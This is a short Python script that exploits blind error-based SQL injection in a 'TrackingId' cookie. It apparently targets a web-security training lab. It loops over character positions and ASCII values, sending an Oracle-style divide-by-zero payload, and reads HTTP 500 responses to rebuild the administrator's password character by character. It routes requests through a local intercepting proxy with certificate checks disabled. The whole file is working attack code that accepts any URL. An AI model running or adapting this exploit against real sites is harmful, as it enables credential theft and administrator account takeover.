import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):  # Assuming password length is 20
        for j in range(32, 126):
            sqli_payload = "' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and ascii(substr(password,%s,1))='%s') || '--" % (i, j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {
                "TrackingId": "wOCpInBW8Ef01bzu" + sqli_payload_encoded,
                "session": "9GdZYHDo0JESXL9aaZ3zXojvGIULEZt3"
            }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s http://example.com" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    print("[+] Retrieving Administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()